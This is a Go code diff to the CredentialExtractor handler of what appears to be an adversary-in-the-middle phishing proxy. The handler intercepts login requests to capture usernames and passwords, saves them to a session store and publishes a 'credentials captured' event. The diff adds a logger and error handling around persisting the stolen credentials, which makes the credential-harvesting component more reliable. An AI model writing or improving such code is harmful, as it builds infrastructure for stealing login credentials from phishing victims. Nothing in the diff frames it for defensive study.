@@ -1,6 +1,7 @@
 package request
 
 import (
+	"log/slog"
 	"net/http"
 	"net/url"
 	"strings"
@@ -19,8 +20,9 @@ type eventPublisher interface {
 
 // CredentialExtractor captures username and password from matching login requests.
 type CredentialExtractor struct {
-	Store sessionUpdater
-	Bus   eventPublisher
+	Store  sessionUpdater
+	Bus    eventPublisher
+	Logger *slog.Logger
 }
 
 func (h *CredentialExtractor) Name() string { return "CredentialExtractor" }
@@ -59,7 +61,9 @@ func (h *CredentialExtractor) Handle(ctx *aitm.ProxyContext, req *http.Request) 
 	}
 
 	if updated {
-		_ = h.Store.UpdateSession(ctx.Session)
+		if err := h.Store.UpdateSession(ctx.Session); err != nil {
+			h.Logger.Warn("failed to persist captured credentials", "session_id", ctx.Session.ID, "error", err)
+		}
 		h.Bus.Publish(aitm.Event{Type: aitm.EventCredsCaptured, Payload: ctx.Session})
 	}
 	return nil
